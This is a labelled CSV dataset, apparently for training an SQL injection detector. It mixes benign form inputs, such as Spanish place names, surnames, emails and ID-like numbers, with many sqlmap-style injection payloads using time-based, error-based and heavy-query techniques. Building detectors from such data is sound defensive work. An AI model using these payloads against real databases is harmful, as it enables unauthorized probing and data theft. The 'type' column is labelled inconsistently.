Text,attack_type,Label,type
6087,norm,0,normal
"1"" and sleep(5)#",sqli,1,normal
"1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi",sqli,1,normal
"calle crehuet, 63 4-h",norm,0,normal
"1"") and 6969=(select 6969 from pg_sleep(5)) and (""btht""=""btht",sqli,1,sql
5690251194310555,norm,0,normal
5239525099748134,norm,0,normal
luczka graciot,norm,0,normal
diez lizano,norm,0,normal
orihuela del tremedal,norm,0,normal
sant mart d'albars,norm,0,normal
magaz de pisuerga,norm,0,normal
magrath,norm,0,normal
"-9281) where 8363=8363 or make_set(8220=5127,5127)--",sqli,1,sql
higuera de la serena,norm,0,normal
"sant sever 63, 6-b",norm,0,normal
torres de barbus,norm,0,normal
"1%')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,1,normal
"1);select benchmark(5000000,md5(0x4c4d6142)) and (8126=8126",sqli,1,sql
ciavaglia de la vega,norm,0,normal
perpi izurrieta,norm,0,normal
"1"")));begin user_lock.sleep(5); end and (((""revx""=""revx",sqli,1,sql
ljund@casadedurcal.sl,norm,0,normal
"1%"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""%""=""",sqli,1,sql
"1"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'ebuo'='ebuo",sqli,1,sql
healy,norm,0,normal
"1%' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",sqli,1,sql
"1) as obhj where 1789=1789 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
1 or sleep(5)# tdgb,sqli,1,normal
abdala,norm,0,normal
5176682769033876,norm,0,normal
1')) or sleep(5) and (('uzhd' like 'uzhd,sqli,1,normal
durham@copiar.com.ke,norm,0,normal
"1')) as xntz where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""jzbb""=""jzbb",sqli,1,sql
24331853s,norm,0,normal
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
41713468r,norm,0,normal
murcia,norm,0,normal
siseo,norm,0,normal
3992,norm,0,normal
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",sqli,1,sql
miles_detmers@sotelink.vu,norm,0,normal
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
49511678s,norm,0,normal
42315,norm,0,normal
pombal 114 3?d,norm,0,normal
80047732g,norm,0,normal
2291171054683392,norm,0,normal
"hinojosa, la",norm,0,normal
